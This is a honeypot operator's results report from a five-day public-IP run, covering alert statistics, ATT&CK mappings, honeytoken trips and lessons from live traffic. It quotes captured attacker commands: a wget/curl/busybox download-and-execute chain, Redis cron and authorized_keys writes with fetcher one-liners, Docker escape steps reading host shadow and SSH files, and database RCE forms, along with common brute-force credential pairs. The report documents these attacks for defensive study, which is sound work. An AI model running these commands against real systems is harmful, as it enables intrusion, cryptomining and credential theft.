# Results: five days on a public-IP host

## Summary

- 116.4 hours on a public-IP VPS, 23 sensors covering 23 engine types: 17.7M alerts stored (about 73M events seen) from 3,337 source addresses.
- Volume is concentrated: three sources produced 64.9% of stored alerts, and SIP and Telnet are 96% of rows. Severity and value are not the same thing as volume.
- CRITICAL alerts (0.16%) were mostly SIP toll fraud, with Docker API container escapes, Redis and database RCE attempts, and ransom notes as the rarer, higher-value classes.
- A planted credential was replayed on the MySQL sensor from outside by three sources; the tripwire path from decoy file to alert worked end to end.
- Running on live traffic exposed defects no unit test had (section 5); each was fixed and is recorded in `../CHANGELOG.md`. Section 6 lists what was not verified.

HoneyPot-MCP ran for 116.4 hours (2026-10-11 18:18 to 2026-10-16 14:42 UTC) on a VPS with a public address. 23 sensors covered 23 engine types; SMTP and DNS exist but were off, as `../KNOWN_LIMITATIONS.md` recommends for a cloud host. This page reports what was captured and what operating it exposed. Every number comes from the run's final database backup (a read-only SQLite file, 11 GB) or from a file in this repository. The query behind each table sits under it in italics.

Conventions that apply to every table:

- **The backup is not published.** It holds captured credentials, malware and attacker addresses. Addresses are left out of this page; countries and event types are not.
- **"Alerts" are stored rows.** The flood guard stores at most 600 events a minute per source and event type and counts the rest (section 1.4). Stored and seen are different numbers.
- **Totals exclude 5,756 internal alerts** (Docker bridge 5,622, loopback 55, `0.x` 79: the platform's own probes). They **include the operator's own test traffic** from the field-test scripts, one address, 5,680 alerts (0.03%). Breakdowns that read payloads (credentials, commands, geography, exploit details) exclude that address as well.
- Rollup queries below use `F` for: `source_ip NOT LIKE '172.17.%' AND source_ip NOT LIKE '127.%' AND source_ip NOT LIKE '0.%'`.

## 1. The run in numbers

| Measure | Value |
|---|---|
| Alerts stored from outside | 17,720,738 (17,726,494 rows in `alert_rollups` before the internal exclusion) |
| Events counted but not stored (flood guard) | 55,478,833 |
| Events the sensors saw, approximately | 73.2M |
| Distinct source addresses | 3,337 |
| Distinct event types | 168 |
| CRITICAL alerts | 27,742, from 137 sources |
| Sensors / engine types | 23 / 23 |

*`SELECT sum(count), count(distinct source_ip) FROM alert_rollups WHERE F` gives 17,720,738 and 3,337. `SELECT sum(json_extract(payload,'$.suppressed')) FROM alerts WHERE event_type='flood_summary'` gives 55,478,833 (0.4 s). Seen = stored minus the 9,981 `flood_summary` rows plus suppressed. Sensors: `SELECT name,type FROM honeypots`.*

### 1.1 Shape in time

| Day (UTC) | Alerts | Distinct sources | Share from the 3 heaviest sources |
|---|---|---|---|
| 2026-10-11 (from 18:18) | 156,960 | 174 | 0.0% |
| 2026-10-12 | 5,050,954 | 793 | 64.3% |
| 2026-10-13 | 2,070,293 | 897 | 31.9% |
| 2026-10-14 | 3,642,417 | 999 | 67.9% |
| 2026-10-15 | 4,342,047 | 922 | 73.9% |
| 2026-10-16 (to 14:42) | 2,458,067 | 629 | 77.7% |

*`SELECT substr(bucket,1,10), sum(count), count(distinct source_ip) FROM alert_rollups WHERE F GROUP BY 1`. Share column: the three sources heaviest over the whole run, per day, computed in Python over `alert_rollups`.*

Across the 117 hourly buckets the median hour held 148,843 alerts, the 90th percentile 211,607 and the maximum 734,813 (2026-10-12 11:00). The five hours of 2026-10-12 08:00 to 12:59 are the only ones above 500,000, and one source supplied 93.5% of them (3,167,500 of 3,387,139). With the three heaviest sources removed, the median hour is 41,439. There is no clean daily cycle: the load follows when a few automated sources run, not the clock.

### 1.2 By engine

| Engine | Alerts | Share | Distinct sources |
|---|---|---|---|
| sip | 13,325,848 | 75.20% | 207 |
| telnet | 3,708,522 | 20.93% | 597 |
| vnc | 269,467 | 1.52% | 146 |
| smb | 178,322 | 1.01% | 176 |
| ssh | 127,537 | 0.72% | 461 |
| rdp | 37,485 | 0.21% | 378 |
| mssql | 31,120 | 0.18% | 74 |
| mysql | 13,976 | 0.08% | 151 |
| http | 5,015 | 0.03% | 379 |
| nfs | 2,620 | 0.01% | 97 |
| postgresql | 1,771 | 0.01% | 130 |
| docker_api | 1,474 | 0.01% | 165 |
| ftp | 1,349 | 0.01% | 112 |
| mongodb | 1,252 | 0.01% | 118 |
| redis | 1,048 | 0.01% | 108 |
| 8 more: elasticsearch 751, pop3 685, memcached 590, rsync 500, imap 436, ldap 374, kubernetes 350, snmp 248 | 3,934 | 0.02% | 46 to 134 each |

*`SELECT CASE WHEN event_type LIKE 'docker_api%' THEN 'docker_api' ELSE substr(event_type,1,instr(event_type,'_')-1) END e, sum(count), count(distinct source_ip) FROM alert_rollups WHERE F GROUP BY 1 ORDER BY 2 DESC`. Grouped by event-type prefix, not by sensor id: Cowrie sensors were recreated during the run, so most SSH and Telnet alerts have no sensor row. 9,981 `flood_summary` rows and 17 `honeytoken_triggered_*` rows are not shown.*

Volume says little about value. SIP and Telnet are 96% of the rows; CRITICAL is 0.16% of them, of which 93.6% (25,874 of 27,630, operator's test traffic removed) is SIP toll fraud and 4.3% (1,175) is shell-written files; the other 581 are spread over 18 event types (section 2).

### 1.3 By severity

| Severity | Alerts | Share |
|---|---|---|
| medium | 8,830,774 | 49.83% |
| high | 7,796,220 | 43.99% |
| low | 1,066,002 | 6.02% |
| critical | 27,742 | 0.16% |

*`SELECT severity, sum(count) FROM alert_rollups WHERE F GROUP BY 1`. Severity is the engine's label for the event type, not a risk score: every SIP REGISTER and every Telnet command is `high`.*

### 1.4 How a few sources dominated the load

The top source accounts for 24.8% of all stored alerts; the top 3 for 64.9%, the top 10 for 80.9% and the top 100 for 98.8%. Of the 3,337 sources, 2,470 (74.0%) produced 10 alerts or fewer and the median source produced 4. 87.3% of sources (2,912) touched one engine only; 36 touched five or more.

| Rank | Share | Cumulative | Dominant event type (share of that source) | Hours between first and last active hour |
|---|---|---|---|---|
| 1 | 24.8% | 24.8% | sip_extension_probe (52%) | 74 |
| 2 | 21.8% | 46.6% | sip_extension_probe (50%) | 54 |
| 3 | 18.3% | 64.9% | sip_extension_probe (95%) | 6 |
| 4 | 5.5% | 70.4% | sip_extension_probe (92%) | 70 |
| 5 | 2.7% | 73.2% | telnet_command_input (74%) | 22 |
| 6 | 2.5% | 75.6% | sip_extension_probe (55%) | 10 |
| 7 | 1.3% | 77.0% | sip_extension_probe (86%) | 70 |
| 8 | 1.3% | 78.3% | telnet_command_input (75%) | 19 |
| 9 | 1.3% | 79.6% | telnet_command_input (74%) | 14 |
| 10 | 1.3% | 80.9% | telnet_command_input (76%) | 52 |

*`SELECT source_ip, sum(count) FROM alert_rollups WHERE F GROUP BY 1 ORDER BY 2 DESC`, then the dominant type and first/last bucket per source. Addresses omitted.*

**The stored figure understates the flood.** The guard counted 55,478,833 further events that it did not store, from 13 sources: 55,431,585 are `sip_extension_probe`, and the three heaviest of those sources are 69.2%, 25.2% and 5.6% of the suppressed total. Stored plus suppressed, the sensor saw about 64.1M extension probes against the 8.7M it stored. The first `flood_summary` is at 2026-10-12 14:04, after the first flood (a 3.25M-alert source on 2026-10-12 08:16 to 13:59). This is consistent with the guard not yet being active during that flood; the deployment time was not checked.

*`SELECT json_extract(payload,'$.event_type'), sum(json_extract(payload,'$.suppressed')) FROM alerts WHERE event_type='flood_summary' GROUP BY 1`.*

### 1.5 Where the CRITICAL alerts came from (geography)

| Country | CRITICAL alerts | Share | Distinct sources |
|---|---|---|---|
| Philippines | 11,875 | 43.0% | 1 |
| United States | 9,225 | 33.4% | 35 |
| France | 3,793 | 13.7% | 8 |
| Seychelles | 1,125 | 4.1% | 2 |
| Bulgaria | 487 | 1.8% | 7 |
| Romania | 349 | 1.3% | 9 |
| The Netherlands | 316 | 1.1% | 11 |
| Belgium | 72 | 0.3% | 5 |
| South Korea | 64 | 0.2% | 4 |
| Vietnam | 57 | 0.2% | 5 |

*`SELECT json_extract(payload,'$.enrichment.geoip.country'), count(*), count(distinct source_ip) FROM alerts WHERE severity IN ('critical','high') AND severity='critical' GROUP BY 1 ORDER BY 2 DESC` (the redundant `IN` clause makes SQLite use the partial index; 1.1 s). The table above also drops the operator's test address, so the United States row is 112 alerts lower than that query. 27,630 alerts from 136 sources remain; 9 had no enrichment.*

Read this table narrowly. GeoIP runs only for CRITICAL alerts, so it describes 136 sources out of 3,337, and the country is where the address geolocates (mostly hosting providers), not where a person sits. The Philippines row is a single source: SIP toll-fraud INVITEs (the same source is 45.9% of all `sip_toll_fraud_attempt`). The United States row is 8,766 SIP toll-fraud alerts plus 345 SSH file writes.

![Attacker origins and top countries, Grafana, snapshot of the live run ending 2026-10-16 10:00 UTC (counts are lower than the final tables)](screenshots/real-run/threat-map.png)

## 2. What attackers did

### 2.1 By ATT&CK tactic and technique

Each event type is mapped with the repository's own mapper (`intel.mitre.map_to_attack`), the same logic as the `attack_summary` tool. 16,710,164 of 17,726,494 alerts (94.3%) map to 34 techniques; the unmapped 1,016,330 are 50 event types, and the 12 largest (999,781 alerts) are connection, session, client-fingerprint and `flood_summary` bookkeeping, deliberately not techniques. The mapped share was 97.9% at 5.0M alerts (CHANGELOG); the Telnet, VNC and SMB bookkeeping rows grew faster than the rest.

| Tactic | Alerts | Share | Techniques |
|---|---|---|---|
| Discovery | 8,845,904 | 49.9% | 6 |
| Credential Access | 4,988,776 | 28.1% | 4 |
| Execution | 2,814,384 | 15.9% | 4 |
| Initial Access | 338,254 | 1.9% | 3 |
| Impact | 26,081 | 0.15% | 5 |
| Reconnaissance | 4,985 | 0.03% | 2 |
| Command and Control | 2,205 | 0.01% | 3 |
| Collection | 1,021 | 0.01% | 4 |
| Privilege Escalation | 42 | <0.01% | 1 |
| Lateral Movement | 15 | <0.01% | 1 |
| Persistence | 8 | <0.01% | 1 |

| Technique | Alerts | Event types behind it (largest first) |
|---|---|---|
| T1046 Network Service Discovery | 8,844,066 | sip_extension_probe 8,677,807; smb_negotiate 59,391; sip_request 53,517 |
| T1110.001 Password Guessing | 4,988,588 | sip_register_attempt 4,517,777; telnet_login_success 291,339; vnc_auth_attempt 66,682 |
| T1059.004 Unix Shell | 2,813,998 | telnet_command_input 2,792,024; ssh_command_input 21,974 |
| T1078 Valid Accounts | 311,351 | telnet_login_success 291,339; ssh_login_success 19,993 |
| T1133 External Remote Services | 26,636 | rdp_connection 13,438; rdp_handshake 13,099 |
| T1496 Resource Hijacking | 25,880 | sip_toll_fraud_attempt |
| T1595.003 Wordlist Scanning | 3,559 | http_active_recon |
| T1613 Container and Resource Discovery | 1,317 | docker_api_probe 885; kubernetes_probe 216 |
| T1105 Ingress Tool Transfer | 1,208 | ssh_file_download 1,175 |
| T1090 Proxy | 994 | ssh_port_forward 442; ssh_port_forward_data 276 |
| T1190 Exploit Public-Facing Application | 267 | http_exploit_attempt 124; redis_config_set 102; redis_key_set 40 |
| T1610 Deploy Container | 100 | docker_api_container_start 52; docker_api_container_create 32 |
| T1611 Escape to Host | 42 | docker_api_container_escape 36; kubernetes_pod_escape 6 |
| T1486 Data Encrypted for Impact | 20 | mongodb_ransom_note |
| T1505.003 Web Shell | 8 | mysql_outfile_write |

*From the repository's virtualenv: for each `(event_type, sum(count))` of `SELECT event_type, sum(count) FROM alert_rollups GROUP BY 1` (all sources, as the tool does), `await map_to_attack([event_type])`; a tactic counts each alert once, a technique counts every alert that maps to it, so `telnet_login_success` is under both T1110.001 and T1078. `screenshots/real-run/attack-navigator-layer.json` holds the same scoring from a snapshot at 17,638,144 alerts (94.3% mapped), taken before the final backup. The mapping is by event type; payload text is not read here (`map_ttps` does that per attacker). T1611 and T1486 come from sensors with very few alerts, and some of those are the operator's own tests (section 2.7).*

![ATT&CK tactics and event types, Grafana, snapshot ending 2026-10-16 10:00 UTC](screenshots/real-run/mitre-coverage.png)

![ATT&CK Navigator layer produced by the attack_navigator_layer tool (all time, 17.6M alerts)](screenshots/real-run/attack-navigator.png)

### 2.2 SIP: the volume, and what it was

SIP is 13,325,848 alerts (75.2%) from 207 sources, and most of it is a few sources enumerating extensions.

| Event | Alerts | Sources | Note |
|---|---|---|---|
| sip_extension_probe | 8,677,807 stored (about 64.1M seen) | 20 | 6,140 distinct extensions; the top extension is 5.0% of probes and the next ten are each about 3%, so these are sequential sweeps |
| sip_register_attempt | 4,517,777 | 18 | digest challenge answered with a fresh nonce; the response is stored with it |
| sip_invite | 49,707 | 37 | |
| sip_toll_fraud_attempt (CRITICAL) | 25,874 | 17 | INVITE from an unregistered peer to a satellite or premium-prefix number or a long `00`-prefixed string; 648 distinct numbers dialled |

*`SELECT event_type, sum(count), count(distinct source_ip) FROM alert_rollups WHERE F AND event_type LIKE 'sip_%' GROUP BY 1`; distinct extensions: `SELECT count(*) FROM (SELECT DISTINCT json_extract(payload,'$.extension') FROM alerts WHERE event_type='sip_extension_probe')` (4 s). Toll-fraud numbers and sources: `alerts` rows with `event_type='sip_toll_fraud_attempt'`, operator's test address removed. The classifier is `is_toll_fraud_target` in `engines/sip.py`.*

The `friendly-scanner` user agent, which the engine names, is 26.4% of probes (2,293,855) and 46.5% of REGISTERs (2,102,693); the rest do not announce a tool. Within toll fraud the two heaviest sources are 45.9% and 33.7% of the INVITEs; the user agents are `pplsip` (46%), `Linksys-SPA942` (39%) and `sipcli/v1.8` (8%). No call is ever connected: every INVITE is answered with a 407 digest challenge (`engines/sip.py`).

### 2.3 Credentials

The SSH and Telnet sensors (Cowrie) accepted almost every login: Telnet accepted 291,298 from 358 sources and refused 3,727, SSH accepted 19,971 from 102 sources and refused 49. The only pairs ever refused were `root/root` and `root/123456` (both protocols) and `root` with no password (SSH, 4). The cause in the Cowrie configuration was not checked.

| Telnet: top pairs | Logins | SSH: top pairs | Logins |
|---|---|---|---|
| root / hi3518 | 30,491 | svc-backup / (one password) | 37 |
| root / Zte521 | 24,300 | root / 12345 | 29 |
| admin / 54321 | 12,406 | root / 1234 | 25 |
| admin / admin | 10,521 | root / 111111 | 25 |
| administrator / 1234 | 8,930 | root / 123456789 | 21 |
| Manager / friend | 5,987 | root / 123123 | 21 |
| root / Pon521 | 5,674 | root / 123 | 20 |
| guest / guest | 5,632 | root / admin | 20 |

Telnet is 78 distinct usernames and 247 distinct pairs, and `root` and `admin` are 70% of logins (125,239 and 78,125 of 291,298): a small list reused by many sources. SSH is the opposite: 2,639 distinct usernames and 18,944 distinct pairs across 102 sources, with `root` only 7.6% (1,525 of 19,971). Top SSH passwords are `123456` (125), `1234` (93), `123` (77), `12345` (59), `admin` (59).

| Other services | Attempts | Sources | Top usernames |
|---|---|---|---|
| mssql_login_attempt | 14,110 | 12 | sa 14,010 (99.3%) |
| mysql_login_attempt | 4,351 | 49 | root 1,613; admin 1,371; sa 1,359 |
| postgresql_login_attempt | 295 | 43 | postgres 272 |
| rdp_nla_auth (NTLMv2 captured) | 10,632 | 146 | Administrator 2,865; administrator 1,438; admin 1,168 (1,745 distinct names) |
| smb_ntlm_auth (NTLMv2 captured) | 58,708 | 31 | administrator 14,881; Administrator 3,650; admin 1,970 |

*SSH/Telnet: `SELECT source_ip, payload FROM alerts WHERE event_type IN ('telnet_login_success','telnet_login_failed','ssh_login_success','ssh_login_failed')`, then count `username`/`password` in Python (public credential lists; `selftest_*` and the operator's test address dropped). The one SSH `svc-backup` password is withheld because it is a single-source pair, not a list entry. Other services: the same on `<service>_login_attempt` / `_auth`.*

### 2.4 Commands on the shell honeypots

Telnet recorded 2,791,972 commands from 288 sources (1,005 distinct strings). Classified by shape:

| Pattern | Commands | Share | Sources |
|---|---|---|---|
| Shell-menu words sent one per line (`system`, `sh`, `enable`, `linuxshell`, `start`, `config terminal`, `su`, `shell`) | 2,019,715 | 72.3% | 258 |
| Writable-directory probe (`>/var/run/.x&&cd /var/run;>/mnt/.x...`) ending in a marker or `rm -rf i` | 267,960 | 9.6% | 67 |
| The same probe followed by a download chain | 240,416 | 8.6% | 66 |
| `/bin/busybox wget;/bin/busybox echo -ne '\x..'` (applet check, random 6-letter marker) | 243,305 | 8.7% | 67 |
| Everything else | 20,576 | 0.7% | 215 |

The download chain is `wget URL || curl -O URL || /bin/busybox wget URL; chmod 777 i || (cp /bin/ls ii; cat i>ii && rm i; cp ii i; rm ii); ./i; busybox echo -e '<marker>'`. Across Telnet and SSH, 240,479 command events carry an `http://` URL, from 120 sources, naming 104 staging hosts (103 bare addresses, one domain) on varying high ports; 99.3% of the URLs have the path `/i`. Smaller groups in "everything else": `busybox HISILICON` applet probes (683), `./dvrHelper selfrep` (325 events, 28 sources), and 228 `echo -ne` commands that contain an ELF header (`\x7F\x45\x4C\x46`), a dropper writing its binary through the shell. No shell command contained `xmrig`, `stratum` or `minerd`: the shells saw loaders, not miners. Miners appear only through the Docker API (2.6).

SSH recorded 21,948 commands from 83 sources. `uname -s -v -n -r -m` is 17,960 (81.8%, 35 sources), a fingerprint check. 1,152 commands from 15 sources are one script (`printf '#!/bin/bash\necho "xxxxxx"\n' > filter && chmod +x filter && ./filter && rm -rf filter`) that tests whether the box runs what it is given; `echo -e "\x6F\x6B"` (471, one source) is the same kind of test. Every `ssh_file_download` (1,175, CRITICAL) is a file the session wrote itself (1,161 by shell redirection, 14 from stdin), not a network download: egress from the container is closed, 1,122 of the files are named `filter`, 1,151 are duplicates of content already seen, and there are 21 distinct hashes.

SSH client software (the version string sent before login, `ssh_client_version`): `SSH-2.0-Go` is 19,773 of 20,664 events from 138 sources, and one key-exchange fingerprint (HASSH `0a07…`) accounts for 17,972 of the 20,453 `ssh_client_kex` events from 37 sources, consistent with one Go brute-force tool behind most SSH traffic. The rest is scanners and tools: ZGrab SSH survey (19 sources), PuTTY (7), libssh2 (9), Nmap's `ssh2-enum-algos` and `ssh-hostkey` scripts (4 each), Fingerprintx (5), paramiko (4), and a `MGLNDD_<address>_22` banner from 7 sources. `analyze_backup.py` finds 28 fingerprint clusters shared by two or more sources and no campaign by its rule (several sources, one event type, one window); the overlap reads as shared tooling rather than coordination, which the data cannot prove either way.

*`SELECT source_ip, json_extract(payload,'$.input') FROM alerts WHERE event_type IN ('telnet_command_input','ssh_command_input')` (13 s for Telnet), then regex classification in Python. Classes are mutually exclusive and exhaustive.*

### 2.5 HTTP

The HTTP sensor stored 5,015 alerts. `http_exploit_attempt`: 112 alerts from 23 sources (an alert can carry several categories).

| Exploit category | Alerts | Typical paths |
|---|---|---|
| webshell | 54 | `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` (13), `/index.php` (11), `/hello.world` (8), `/php-cgi/php-cgi.exe` (8) |
| path_traversal | 46 | `/index.php` (14), `/cgi-bin/%2e%2e/.../bin/sh` and the literal `../` form (18 together), `/../.env` (6) |
| lfi_rfi | 45 | `/index.php` (11), `/hello.world` (9), `/php-cgi/php-cgi.exe` (8), `/test.hello` (6) |
| command_injection | 34 | the `/cgi-bin/.../bin/sh` forms (18), `/php-cgi/php-cgi.exe` (8), `/cgi-bin/luci/;stok=/locale` (4) |
| deserialization | 4 | `/` (2), `/index.action` (2) |

The bait files were served 143 times to 23 sources: `/.env` 101 (21 sources), `/config.json` 12, `/wp-config.php` 11, `/.aws/credentials` 10, `/.kube/config` 9. `http_active_recon` (session with five or more requests) is 3,541; `http_credential_submit` 157 from 8 sources.

*`SELECT source_ip, payload FROM alerts WHERE event_type='http_exploit_attempt'` and `'http_decoy_served'`, operator's test address removed; categories from `payload.exploit_categories`.*

### 2.6 Docker API: container escapes

`docker_api` recorded 1,474 alerts from 165 sources, mostly recon (`docker_api_probe` 879 from 119 sources). Creating a container is where it stops being recon: 32 `container_create` (10 sources), 46 `container_start` (14), 26 `exec` (4 sources), 10 `image_pull` (5), and **30 `container_escape` (17 sources, CRITICAL)**. An escape event names its reasons from the create body:

| Reason named in the event | Events (of 30) |
|---|---|
| Mounts the host root filesystem | 23 |
| Privileged container | 16 |
| Payload-stage command | 17 |
| Host network namespace | 12 |
| Host PID / host IPC namespace | 1 / 1 |
| Known mining image | 1 |

Images used: `alpine` (18 events, three spellings), `postgres:15.4` (6), one `miningcontainers/xmrig` and 5 by image id. In 11 events the command runs `chroot` into the mounted root, in 13 it fetches with `curl`, and three name `xmrig` (pools `supportxmr`, `moneroocean` and `kryptex`; one fetches `xmrig.bin`); one writes a crontab entry. After a create, four sources ran `exec`: `head -3 /host/etc/shadow`, `head -3 /host/etc/passwd`, `ls -la /host/root/.ssh/`, and, four times, a command that starts `cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----`.

*`SELECT source_ip, payload FROM alerts WHERE event_type LIKE 'docker_api_%'`, operator's test address removed (6 of the 36 `container_escape` rows in the rollups were the operator's own `field_test.py` run); fields `image`, `cmd`, `escape_indicators`.*

### 2.7 Redis, databases, and engines nobody attacked

**Redis** recorded 92 `CONFIG SET` from 6 sources. The values show the intent: `dir` `/etc/cron.d` (5) with `dbfilename` `redis-miner` (4); `dir` `/var/spool/cron/` (2) with `dbfilename` `root` (2); `dir` `/root/.ssh/` (2) with `dbfilename` `authorized_keys` (2); and module file names `exp.so` (2) and `exp-558251.so` (1). 8 `redis_rce_dropper` events (CRITICAL, 5 sources) record the write itself: `SAVE` to `/etc/cron.d/redis-miner` (4), `/var/spool/cron//root` (2), `/root/.ssh//authorized_keys` (1), and `BGSAVE` to `/etc/cron.d/apache` (1). The planted cron values are one-line `wget URL || perl -MIO::Socket::INET ...; chmod 755 systemd; ./systemd redis` fetchers (4 of 35 `SET`s). Rogue-replica `SLAVEOF` appears 23 times from 5 sources, `MODULE LOAD` 13 times from 3.

**Databases.** `mysql_udf_rce` (CRITICAL) 118 events from 4 sources (`CREATE FUNCTION ... SONAME '<name>.dll'`); `mysql_outfile_write` 8 (2 sources); `postgresql_copy_program_rce` 22 (4 sources: `COPY ... FROM PROGRAM` running a base64-wrapped script); `mongodb_ransom_note` 15 (8 sources: `README` / `READ_ME_TO_RECOVER_YOUR_DATA` inserts), `mongodb_destructive` 45.

**CRITICAL event types seen only from the operator's own tests, not from the internet:** `kubernetes_secret_access` 12, `kubernetes_pod_escape` 6, `kubernetes_pod_exec` 6, `memcached_amplification_attempt` 9, `snmp_set_request` 4, `ldap_jndi_lookup` 1. The Kubernetes, memcached, SNMP and LDAP sensors recorded 350, 590, 248 and 374 alerts in total and none of them CRITICAL from outside. Their detection is proven by `field_test.py` (section 6), not by an attack seen in the wild.

*Rollups: `SELECT event_type, sum(count), count(distinct source_ip) FROM alert_rollups WHERE F AND source_ip NOT IN (<test address>) AND severity='critical' GROUP BY 1`; Redis fields from `payload.parameter/value/target_path`.*

## 3. The bait: tracked credentials tripped from outside

A honeytoken credential exists only in decoy files. Using it elsewhere has no benign explanation, which makes it the highest-fidelity signal the platform produces. One credential token was tripped by outside sources during the run: `public-bait-mysql-env`, a MySQL username and password created 2026-10-12 02:55:42. The HTTP decoy serves it as the database login inside `/.env`, `/config.json` and `/wp-config.php`; the engine matches the pair when it is later replayed on the MySQL sensor (and on SSH, FTP, PostgreSQL and the other credential services).

| Source | Trips | Times (UTC) | What it did before the trip |
|---|---|---|---|
| A | 5 | 2026-10-12 23:18; 10-14 16:27, 17:10, 18:40; 10-15 21:34 | Fetched `/.env` first (21:55:50 on 10-12, again at 23:18:07), after requesting `.env` variants and 13 database-admin paths (phpMyAdmin, Adminer and similar) in 4.5 s. Opened MySQL 0.2 s after its last HTTP request, 2.3 s after the `/.env` response. Each time it then ran the same three statements (`SET NAMES utf8mb4`, `SET autocommit=0`, `show databases`). It also tried the pair on SSH (24 logins: the full username, the part after its underscore, and `root`; the only command, 6 times, was `echo 'wakanda';uname -a;`), requested `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` (17 times) and rotated 7 User-Agent strings, which reads as one credential-harvesting toolkit working through every service the `.env` could unlock. 461 alerts in all, across HTTP, SSH and MySQL. |
| B | 2 | 2026-10-15 00:20, 00:24 | Nothing before: the first event from this address is the MySQL connection (over TLS). Also tried `root` and `admin`, then probed for one specific database name. |
| C | 1 | 2026-10-16 12:01 | Nothing before: first event is the MySQL connection (over TLS), then `root` and `admin` guesses. |

Eight trip alerts, three sources. The delay from token creation to the first trip was 20 h 22 m 28 s; B and C used it 2 d 21 h and 4 d 9 h after creation. `/.env` was first served after the token existed at 08:35 on 2026-10-12 and 100 times to 20 sources in all; one of those 20 went on to replay the pair. B and C had touched no other sensor, so the pair reached them some other way (from whoever read `/.env`, or from a list); the data cannot say which.

What did not trip: 33 of the 35 revoked tokens carry field-test labels (`ft...`, `test-...`, `field-...`); the other two have other labels. The canary-URL token `public-bait-canary-env` was never called from outside. On SSH, the sensor was rebuilt at 2026-10-15 23:18 with `~/.my.cnf` and `~/.bash_history` bait under `/root`; 2,659 SSH sessions followed and no outside session ran a command that reads `.my.cnf`. The other 11 `honeytoken_triggered_*` alerts (of 19 total) are the operator's field-test tokens and one replay of the bait from the operator's test address on 2026-10-15 23:19, run to check the Cowrie bait after the rebuild.

*`SELECT id, timestamp, event_type, source_ip FROM alerts WHERE event_type LIKE 'honeytoken_triggered_%' ORDER BY timestamp` (19 rows; sources labelled by order, addresses not shown); token creation from `SELECT id, label, type, status, created_at, triggered_at FROM honeytokens`; per-source history from `SELECT timestamp, event_type, json_extract(payload,'$.path') FROM alerts WHERE source_ip = ? ORDER BY timestamp`. The delay is measured from token creation; the pair is served from then on under the "lowest active token id" rule (`credential_match.planted_credential`, CHANGELOG). Counts differ by two canary rows between `alerts` (19) and the rollups (17) because loopback canary callbacks are internal.*

## 4. Captured artifacts

| Location (quarantined sample directory) | Files | Total size | Size range |
|---|---|---|---|
| `honeypot-hp-ssh/downloads` | 4 | 5,224 B | 26 to 4,745 B |
| `honeypot-hp-telnet/downloads` (`redir_*`) | 65 | 453 B | 0 to 202 B |
| `honeypot-hp-ssh/tty` (session recordings) | 12 | 13,786 B | 110 to 5,034 B |
| `honeypot-hp-telnet/tty` | 74 | 1,301,112 B | 432 to 88,958 B |

*`find <dir> -type f ! -name .gitignore -exec stat -f %z {} +` (listing only, nothing opened). `SHA256SUMS` has 159 lines: these 155 files plus four `.gitignore` markers.*

`file` was not run on them: every file is mode `0000` and was left that way. The sizes already say most of this set is not malware: 63 of the 65 Telnet download files are 0 or 1 byte (leftovers of failed fetches, with egress closed), and the largest download is 4,745 B, too small for a typical bot binary [inference]. The alerts reference more than the directory holds: 34 distinct SHA-256 hashes appear in file events (`ssh_file_download`, `telnet_file_download`, `ssh_file_upload`, `ftp_file_upload`, `ftp_file_download`), of which 5 are file names in the quarantine. Cowrie keeps downloads and recordings in tmpfs, so they are lost whenever its container restarts; the Telnet container was killed for memory repeatedly (section 5) and both Cowrie sensors were rebuilt on 2026-10-15 at 23:18, so this directory is what was still in the containers at backup time.

*Hashes: `payload.shasum` or `payload.sha256` of those five event types, operator's test address removed; `SELECT count(*) FROM alerts WHERE event_type='ssh_file_download'` is 1,175, with 21 distinct hashes.*

## 5. What live traffic taught us

Each of these needed real traffic, a real client or a real backup; the unit suite did not catch them. Figures are the ones in `../CHANGELOG.md` and `FIELD_TEST.md`.

| What was wrong | How it was found | Fix | Measured |
|---|---|---|---|
| One SIP source sent about 190 events/s; the table went from 1.1M to 4.9M rows in nine hours (3.8 GB, past the 4 GB host's RAM) and the basic tools timed out | Reading the data the morning after the first night | Index on `alerts.honeypot_id`; a suppression rule; `alert_rollups`; the flood guard | `honeypot_list` 51 s to 0.02 s on a 1.1M-row copy; rate-limit rule: 198 to 11 events/s, CPU 112% to 23%; with rollups `alerts_stats`/`soc_brief`/`honeypot_list` 27 s, over 100 s and 51 s to 0.01 s or less |
| The Telnet sensor was OOM-killed 246 times in 20 hours: the container's cgroup counts every tmpfs file's kernel memory (43,591 files in `downloads/`, 99.8% 0 bytes), and one source opened about 2,400 sessions in six minutes | A backup that finished with 33 health warnings; `docker events` (`docker inspect` resets `OOMKilled`) | In-container janitor, 128 connections per source in the firewall, 512 MiB and one CPU, watchdog needs two failed sweeps | 220 held connections from one host: 131 admitted, 89 dropped; CPU-throttled periods about 90% to 1% |
| The operations console never returned on 17.6M alerts (re-aggregated the raw table ten times per poll) | Rendering it against the live deployment | Reads hourly rollups; literal SQL so the partial index is used | No answer in 100 to 120 s; now 0.2 to 3 s live; 7 days: 22 s after a first rewrite, 0.61 s after the second; CRITICAL lookup 12.7 s to 0.47 s |
| `sql_query` did not enforce its 15 s limit (`asyncio.wait_for` cannot stop a SQLite scan in a worker thread) | Running it on 14.9M real alerts | Deadline is a SQLite progress handler | Query ran 87 s and left the session in `PendingRollbackError`; now stops at 16.5 s and the next query works |
| `analyze_campaign` correlated only the newest 5,000 alerts | Oracle against raw SQL | Built from exact hourly rollups | 7 campaigns from the last 16 minutes versus 274 in SQL; now 274 and 457,839 events on both sides |
| The platform recorded its own health probes as an attacker (Docker bridge address) | Reading live data | Probe claims its bound port under the bridge gateway too | 1,060 connect/close pairs per sensor in nine hours; 48 events in six minutes before, none in four after |
| Throttled notifications were counted as deliveries, and a CRITICAL flood bypassed the throttle | Reading subscription counters; one source sending about 700 toll-fraud INVITEs an hour | Throttled events count as `suppressed_count`; repeats within 300 s coalesce | 13,025 "deliveries" in nine hours against a handful of messages; 24 messages in ten minutes against about 12 a minute |
| `backup.sh` ran `sqlite3 .backup` for 38 minutes without finishing; a downloaded WAL snapshot could not be opened read-only; `--samples` reported "0 files" | Running it on the live host | `VACUUM INTO`; open `immutable=1`; missing directory is a failure | 203 s on the same database; the containers held 32 downloads and 18 recordings |
| FTP: login worked, `LIST` timed out (the passive data port was not open in the firewall) | Real FTP client against the live host | Passive range plus firewall rule | Live run had 9 anonymous logins and 9 passive attempts and no listing; now `LIST`, `SIZE`, `RETR` agree (158 bytes) |
